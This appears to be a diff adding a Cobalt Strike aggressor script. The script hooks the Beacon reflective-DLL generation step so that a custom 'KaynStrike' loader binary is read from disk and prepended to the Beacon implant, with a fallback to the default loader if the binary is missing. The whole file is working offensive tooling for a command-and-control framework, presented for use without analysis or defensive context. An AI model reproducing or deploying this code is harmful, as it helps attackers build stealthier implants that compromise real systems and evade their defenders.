@@ -1,0 +1,15 @@
+
+set BEACON_RDLL_GENERATE {
+	$hnd = openf( script_resource( "bin/KaynStrike.". $3 .".bin" ) );
+	$kayn = readb( $hnd, -1 );
+	closef( $hnd );
+
+	if ( strlen( $kayn ) == 0 ) {
+		warn( 'KaynStrike not found... revert to default cobalt strike loader' );
+		return $null;
+	}
+
+	warn("KaynStrike Loader extracted length: " . strlen( $kayn ));
+
+	return $kayn . $2;
+};
